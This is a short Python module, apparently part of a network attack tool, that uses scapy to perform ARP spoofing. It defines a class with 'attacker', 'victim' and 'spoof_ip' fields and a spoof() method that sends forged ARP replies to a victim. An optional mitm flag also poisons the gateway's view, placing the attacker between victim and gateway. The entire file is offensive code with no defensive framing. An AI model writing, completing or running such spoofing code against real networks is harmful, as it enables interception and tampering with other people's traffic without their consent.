#!/usr/bin/env python
from classes.User import User
from classes.ARPPacket import ARPPacket
from scapy.all import *

class ARP:
    def __init__(self, attacker, victim, spoof_ip):
        self.attacker = attacker
        self.victim = victim
        self.spoof_ip = spoof_ip


    def spoof(self, mitm = False):
        victim_packet = ARPPacket(
            self.attacker,
            self.victim,
            self.spoof_ip
        )
        victim_packet.send()
        
        if (mitm):
            gateway = User(self.spoof_ip)
            gateway.get_mac()
            gateway_packet = ARPPacket(
                gateway,
                self.victim,
                self.attacker
            )
            gateway_packet.send()
